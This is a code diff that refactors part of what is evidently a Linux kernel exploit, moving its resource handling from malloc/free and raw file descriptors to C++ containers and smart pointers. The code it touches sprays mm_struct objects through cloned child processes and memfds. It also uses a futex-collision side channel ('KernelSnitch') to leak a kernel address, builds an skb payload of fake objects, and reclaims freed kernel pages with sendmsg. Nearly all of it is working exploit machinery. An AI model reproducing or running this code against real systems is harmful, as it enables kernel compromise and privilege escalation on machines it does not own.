@@ -6,7 +6,7 @@
 
 #define ks (g_heap_context.snitch)
 #define mm_objs_per_slab (g_heap_context.mm_objs_per_slab)
-#define skb_buf (g_heap_context.skb_buffer)
+#define skb_buf (g_heap_context.skb_buffer.get())
 #define reclaim_sv (g_heap_context.current.reclaim.fd)
 #define prepare_ctx (g_heap_context.prepare)
 #define spray_ctx (g_heap_context.spray)
@@ -299,23 +299,6 @@ void discard_prebuilt_page(void) {
   payload_page_destroy(&g_heap_context.prebuilt);
 }
 
-void close_ctx_memfds(struct mm_ctx *ctx) {
-  for (size_t i = 0; i < ctx->mm_cnt; i++) {
-    if (ctx->memfds[i] > 0) {
-      close(ctx->memfds[i]);
-      ctx->memfds[i] = -1;
-    }
-  }
-}
-
-void free_ctx_storage(struct mm_ctx *ctx) {
-  free(ctx->childs);
-  free(ctx->memfds);
-  ctx->childs = NULL;
-  ctx->memfds = NULL;
-  ctx->mm_cnt = 0;
-}
-
 /* Decoupling plan: clean one heap-preparation attempt. Input: HeapContext;
  * output: all attempt-owned resources released. Future:
  * heap_context_reset_attempt(), separate from route cleanup. */
@@ -324,16 +307,14 @@ void cleanup_page_prepare_state(void) {
   close_ctx_memfds(&spray_ctx);
   close_ctx_memfds(&pre_ctx);
   close_ctx_memfds(&post_ctx);
-  if ((g_heap_context.leak_memfd) > 0) {
-    close((g_heap_context.leak_memfd));
-    (g_heap_context.leak_memfd) = -1;
+  if (g_heap_context.leak_memfd.get() > 0) {
+    g_heap_context.leak_memfd.reset();
   }
   free_ctx_storage(&prepare_ctx);
   free_ctx_storage(&spray_ctx);
   free_ctx_storage(&pre_ctx);
   free_ctx_storage(&post_ctx);
-  free(skb_buf);
-  skb_buf = NULL;
+  g_heap_context.skb_buffer.reset();
 }
 
 /* Decoupling plan: create a helper child and associated memfd. Input/output:
@@ -349,21 +330,17 @@ int clone_memfd(void) {
  * Inputs: profile and HeapContext; output: initialized sets/status. Future:
  * heap_context_prepare_mm_sets(), returning errors instead of exiting. */
 void prepare_ctxs(void) {
-  prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
-  prepare_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), prepare_ctx.mm_cnt));
-  prepare_ctx.memfds = static_cast<int *>(calloc(sizeof(int), prepare_ctx.mm_cnt));
+  prepare_ctx.childs.assign(8 * mm_objs_per_slab, 0);
+  prepare_ctx.memfds.assign(8 * mm_objs_per_slab, 0);
 
-  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
-  spray_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), spray_ctx.mm_cnt));
-  spray_ctx.memfds = static_cast<int *>(calloc(sizeof(int), spray_ctx.mm_cnt));
+  spray_ctx.childs.assign((1 + MM_PARTIALS) * mm_objs_per_slab, 0);
+  spray_ctx.memfds.assign((1 + MM_PARTIALS) * mm_objs_per_slab, 0);
 
-  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
-  pre_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), pre_ctx.mm_cnt));
-  pre_ctx.memfds = static_cast<int *>(calloc(sizeof(int), pre_ctx.mm_cnt));
+  pre_ctx.childs.assign(mm_objs_per_slab - 1, 0);
+  pre_ctx.memfds.assign(mm_objs_per_slab - 1, 0);
 
-  post_ctx.mm_cnt = mm_objs_per_slab;
-  post_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), post_ctx.mm_cnt));
-  post_ctx.memfds = static_cast<int *>(calloc(sizeof(int), post_ctx.mm_cnt));
+  post_ctx.childs.assign(mm_objs_per_slab, 0);
+  post_ctx.memfds.assign(mm_objs_per_slab, 0);
 }
 
 /* Decoupling plan: construct shared fake objects and route-specific waiter data.
@@ -508,15 +485,15 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
   prepare_ctxs();
 
-  skb_buf = static_cast<unsigned char *>(malloc(SKB_SEND_SIZE));
+  g_heap_context.skb_buffer = std::make_unique<unsigned char[]>(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
 
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
     prepare_ctx.childs[i] = clone_child();
     prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
   }
 
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
@@ -532,29 +509,29 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
     pre_ctx.childs[i] = clone_child();
   }
   child_leak = clone_leak_child();
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < post_ctx.childs.size(); i++) {
     post_ctx.childs[i] = clone_child();
   }
 
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
-  (g_heap_context.leak_memfd) = open_memfd(child_leak);
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+  g_heap_context.leak_memfd.reset(open_memfd(child_leak));
+  for (size_t i = 0; i < post_ctx.childs.size(); i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
 
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
     kill_child(pre_ctx.childs[i]);
   }
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < post_ctx.childs.size(); i++) {
     kill_child(post_ctx.childs[i]);
   }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
     kill_child(spray_ctx.childs[i]);
   }
   pr_info("[spray] finding futex collisions... +%lldms\n",
@@ -607,7 +584,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   if (!snitch.has_collisions()) {
     pr_warning("[spray] futex collisions not found\n");
     snitch.reset();
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
@@ -629,7 +606,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
       leaked >= g_direct_map_end) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
     snitch.reset();
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
@@ -639,7 +616,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   if (!prepare_skb_payload(base, request)) {
     snitch.reset();
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
@@ -674,15 +651,15 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   sched_yield();
   sched_yield();
   sched_yield();
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
     SYSCHK(close(pre_ctx.memfds[i]));
     pre_ctx.memfds[i] = -1;
   }
-  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
+  for (size_t i = 0; i < post_ctx.childs.size() - 1; i++) {
     SYSCHK(close(post_ctx.memfds[i]));
     post_ctx.memfds[i] = -1;
   }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+  for (size_t i = 0; i < spray_ctx.childs.size(); i += mm_objs_per_slab) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
   }
@@ -693,8 +670,8 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   sched_yield();
   sched_yield();
   sched_yield();
-  SYSCHK_pr(close(g_heap_context.leak_memfd), "SYSCHK(" "close(memfd_leak)" "): %m\n");
-  (g_heap_context.leak_memfd) = -1;
+  SYSCHK_pr(close(g_heap_context.leak_memfd.release()), "SYSCHK(" "close(memfd_leak)" "): %m\n");
+  g_heap_context.leak_memfd.reset();
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -705,7 +682,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
   snitch.reset();
 
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+  for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
     SYSCHK(close(prepare_ctx.memfds[i]));
     prepare_ctx.memfds[i] = -1;
     kill_child(prepare_ctx.childs[i]);
